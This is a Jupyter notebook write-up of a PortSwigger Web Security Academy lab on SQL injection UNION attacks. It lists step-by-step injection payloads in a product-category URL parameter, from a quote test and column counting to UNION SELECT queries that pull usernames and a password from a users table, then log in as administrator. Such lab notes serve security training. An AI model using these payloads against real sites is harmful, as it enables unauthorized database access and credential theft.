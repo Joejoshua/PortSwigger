{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: SQL injection UNION attack, retrieving multiple values in a single column\n",
    "\n",
    "- sqli: product category \n",
    "- end goal: retrieves all usernames and passwords and login as administrator user"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "- url: `https://0a4a006503f28d10808b9e12003f0018.web-security-academy.net/`\n",
    "\n",
    "- front-end: `/filter?category=Accessories`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from prodct where category = 'Accessories' and released = 1\n",
    "```\n",
    "\n",
    "- check sqli vulnerability\n",
    "- front-end: `/filter?category=Accessories'`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from prodct where category = 'Accessories'' and released = 1\n",
    "'-- 500 Internal Server Error\n",
    "```\n",
    "\n",
    "- front-end: `/filter?category=Accessories'--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from prodct where category = 'Accessories'--' and released = 1\n",
    "-- 200 OK\n",
    "```\n",
    "\n",
    "- determine how many columns are contain on this website\n",
    "- front-end: `/filter?category=Accessories' order by 2--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from prodct where category = 'Accessories' order by 2--' and released = 1\n",
    "-- 200 OK: I found 2 columns which contain this website\n",
    "```\n",
    "\n",
    "- determine which columns are contain text\n",
    "this website\n",
    "- front-end: `/filter?category=Accessories' union select null, 'a'--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from prodct where category = 'Accessories' union select null, 'a'--' and released = 1\n",
    "-- 200 OK: I found 1 column is contain with text\n",
    "```\n",
    "\n",
    "- output data from other tables\n",
    "- front-end: `/filter?category=Accessories' union select null, username from users--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from prodct where category = 'Accessories' union select null, username from users--' and released = 1\n",
    "-- 200 OK: username: administrator\n",
    "```\n",
    "- front-end: `/filter?category=Accessories' union select null, password from users--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from prodct where category = 'Accessories' union select null, password from users--' and released = 1\n",
    "-- 200 OK: password: 0fa867hlfg4hpfgh9k00\n",
    "```\n",
    "- login administrator account\n",
    "- Congratulations, you solved the lab!"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
